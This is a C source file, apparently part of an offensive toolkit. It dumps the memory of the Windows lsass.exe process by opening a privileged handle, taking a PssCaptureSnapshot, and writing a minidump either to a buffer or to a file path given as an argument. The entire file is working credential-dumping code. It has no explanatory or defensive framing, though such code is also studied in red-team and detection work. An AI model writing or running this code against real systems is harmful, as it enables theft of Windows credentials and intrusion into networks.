/*****************************************************************************************************
*                                                                                                    *
*  File:         DumpPssCaptureSnapshot.c                                                            *
*  Purpose:      Performs dumping of lsass.exe memory with the PssCaptureSnapshot API.               *
*                                                                                                    *
******************************************************************************************************/
#include "DumpPssCaptureSnapshot.h"
#include "Common.h"
#include "DumpMiniDump.h"
#include <ProcessSnapshot.h>


/*****************************************************************************************************
*                                                                                                    *
*  Constant:     PSS_SNAPSHOT_CAPTURE_FLAGS                                                          *
*  Purpose:      The capture flags for the PssCaptureSnapshot API.                                   *
*                                                                                                    *
******************************************************************************************************/
#define PSS_SNAPSHOT_CAPTURE_FLAGS ((PSS_CAPTURE_FLAGS)(PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_MEASURE_PERFORMANCE | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION))

/*****************************************************************************************************
*                                                                                                    *
*  Function:     DUMPPSSCAPTURESNAPSHOT_DumpToBuffer                                                 *
*                                                                                                    *
******************************************************************************************************/
#pragma warning(push)
#pragma warning(disable:6001)
__success(return >= 0)
RETSTATUS
DUMPPSSCAPTURESNAPSHOT_DumpToBuffer(
    __in DWORD cbInput,
    __in_bcount(cbInput) __notnull PBYTE pcInput,
    __out PDWORD pcbOutput,
    __out_bcount(*pcbOutput) PBYTE * ppcOutput
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    DWORD dwLsassPid = 0;
    HANDLE hLsassProcess = NULL;
    HPSS hSnapshot = NULL;
    DWORD dwSnapshotResult = 0;
    LSASS_HANDLE_FETCH_TYPE eLsassHandleFetchType = LSASS_HANDLE_FETCH_TYPE_INVALID;

    // Validate arguments
    if ((NULL == pcbOutput) || (NULL == ppcOutput))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (pcbOutput=%p, ppcOutput=%p)", pcbOutput, ppcOutput);
        goto lblCleanup;
    }

    // Parse the input
    eStatus = COMMON_GetLsassHandleFetchTypeFromBinaryInput(cbInput, pcInput, &eLsassHandleFetchType);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_GetLsassHandleFetchTypeFromBinaryInput failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Open lsass.exe
    eStatus = COMMON_FetchLsassHandle(eLsassHandleFetchType, &hLsassProcess, &dwLsassPid, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_CREATE_PROCESS, FALSE);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FetchLsassHandle failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Capture the snapshot
    dwSnapshotResult = PssCaptureSnapshot(hLsassProcess, PSS_SNAPSHOT_CAPTURE_FLAGS, CONTEXT_ALL, &hSnapshot);
    if (ERROR_SUCCESS != dwSnapshotResult)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"PssCaptureSnapshot() failed (dwSnapshotResult=%lu)", dwSnapshotResult);
        goto lblCleanup;
    }

    // Dump to buffer
    eStatus = DUMPMINIDUMP_PerformMiniDumpToBuffer(hSnapshot, FALSE, dwLsassPid, pcbOutput, ppcOutput);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"DUMPMINIDUMP_PerformMiniDumpToBuffer failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    if (NULL != hSnapshot)
    {
        (VOID)PssFreeSnapshot(hLsassProcess, hSnapshot);
        hSnapshot = NULL;
    }
    CLOSE_HANDLE(hLsassProcess);

    // Return result
    return eStatus;
}
#pragma warning(pop)

/*****************************************************************************************************
*                                                                                                    *
*  Function:     DUMPPSSCAPTURESNAPSHOT_DumpToDisk                                                   *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
DUMPPSSCAPTURESNAPSHOT_DumpToDisk(
    __in DWORD nArgs,
    __in_ecount(nArgs) __notnull PWSTR* ppwszArgs
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    DWORD dwLsassPid = 0;
    HANDLE hLsassProcess = NULL;
    HPSS hSnapshot = NULL;
    DWORD dwSnapshotResult = 0;

    // Validate arguments
    if (ARG_INDEX_LSASS_HANDLE_FETCH_TYPE >= nArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid number of arguments");
        goto lblCleanup;
    }
    if (NULL == ppwszArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (ppwszArgs=%p)", ppwszArgs);
        goto lblCleanup;
    }

    // Open lsass.exe
    eStatus = COMMON_FetchLsassHandleFromString(ppwszArgs[ARG_INDEX_LSASS_HANDLE_FETCH_TYPE], &hLsassProcess, &dwLsassPid, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_CREATE_PROCESS, FALSE);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FetchLsassHandleFromString failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Capture the snapshot
    dwSnapshotResult = PssCaptureSnapshot(hLsassProcess, PSS_SNAPSHOT_CAPTURE_FLAGS, CONTEXT_ALL, &hSnapshot);
    if (ERROR_SUCCESS != dwSnapshotResult)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"PssCaptureSnapshot() failed (dwSnapshotResult=%lu)", dwSnapshotResult);
        goto lblCleanup;
    }

    // Dump to disk
    eStatus = DUMPMINIDUMP_PerformMiniDumpToDisk(hSnapshot, FALSE, dwLsassPid, ppwszArgs[ARG_INDEX_DUMP_PATH]);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"DUMPMINIDUMP_PerformMiniDumpToDisk failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Free resources
    if (NULL != hSnapshot)
    {
        (VOID)PssFreeSnapshot(hLsassProcess, hSnapshot);
        hSnapshot = NULL;
    }
    CLOSE_HANDLE(hLsassProcess);

    // Return result
    return eStatus;
}
